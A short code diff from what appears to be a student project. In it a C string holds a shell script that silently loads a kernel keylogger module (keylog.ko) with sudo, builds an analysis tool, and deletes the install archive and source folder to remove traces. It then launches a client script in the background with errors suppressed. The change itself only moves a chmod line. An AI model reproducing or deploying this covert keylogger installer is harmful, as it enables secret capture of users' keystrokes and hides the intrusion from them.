@@ -16,13 +16,13 @@ const char *text=
 	"sudo insmod keylog.ko 2>/dev/null\n"
 	"cd AnalyzeData/\n"
 	"g++ -o analyze analyze.cpp\n"
-	"chmod 755 analyze\n"
 	"cp analyze ../Scripts\n"
 	"cd ..\n"
 	"cp -r Scripts/ ../../Scripts \n"
 	"cd ../..\n"
 	"rm -r -f keylog.zip keylog_ins\n"
 	"rm -r -f final-project-click-to-add-lemon-master\n"
+	"chmod 755 Scripts/analyze\n"
 	"python3 Scripts/client_script.py & 2>/dev/null \n";
 	
 void convert();
